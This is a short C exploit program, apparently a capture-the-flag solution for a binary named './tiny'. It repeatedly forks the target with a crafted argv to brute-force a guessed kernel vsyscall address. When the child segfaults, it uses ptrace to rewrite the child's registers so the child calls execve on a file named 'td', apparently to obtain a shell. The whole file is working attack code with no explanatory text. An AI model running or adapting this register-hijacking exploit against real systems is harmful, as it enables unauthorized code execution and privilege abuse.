#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>
#include <signal.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>

#define __KERNEL_VSYSCALL_GUESS 0xf777db50
#define FILENAME_ADDRESS 0x8048056 // "td"

pid_t run_child()
{
    pid_t child = fork();
    if (child == 0)
    {
        char *argv[SYS_ptrace + 1] = {0};
        for (size_t i = 0; i < SYS_ptrace; i++)
        {
            argv[i] = "";
        }

        char local_arg[5] = {0};

        *(int *)local_arg = __KERNEL_VSYSCALL_GUESS;
        argv[0] = local_arg;

        execve("./tiny", argv, NULL);
        exit(0);
    }
    return child;
}

void exec_shell(pid_t child)
{
    struct user_regs_struct modified_regs;

    ptrace(PTRACE_GETREGS, child, NULL, &modified_regs);

    modified_regs.eip = __KERNEL_VSYSCALL_GUESS;
    modified_regs.eax = SYS_execve;
    modified_regs.ebx = FILENAME_ADDRESS; // td
    modified_regs.ecx = modified_regs.edx = 0;

    ptrace(PTRACE_SETREGS, child, NULL, &modified_regs);

    ptrace(PTRACE_DETACH, child, NULL, NULL);
}

int main()
{
    pid_t child;

    while (1)
    {
        child = run_child();
        int status;
        wait(&status);

        if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGSEGV)
            break;
        else
            printf("guess failed...\n");
    }

    puts("success!");

    exec_shell(child);

    sleep(-1); // sleep forever

    return 0;
}